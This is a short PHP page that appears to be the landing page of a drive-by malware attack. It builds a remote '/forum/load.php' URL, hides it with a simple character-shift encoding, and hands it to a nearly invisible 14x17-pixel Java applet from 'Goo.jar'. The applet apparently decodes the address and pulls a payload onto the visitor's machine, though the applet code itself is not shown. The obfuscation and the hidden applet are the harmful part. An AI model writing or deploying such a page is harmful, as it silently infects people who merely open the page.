<?php
 $url=file_get_contents("link.php");
 $url= $url."/forum/load.php?showforum=obe";
 $str = "";
            for($j = 0; $j < strlen($url); $j++)
            {
                $c = ord($url[$j]);
                $c += 4;
                $str .= chr($c);
            }
?>
<body>
<applet code='Too.class' archive='Goo.jar' width='14' height='17'>
<param name="dest" value="<?php echo $str;?>">
</applet>
</body>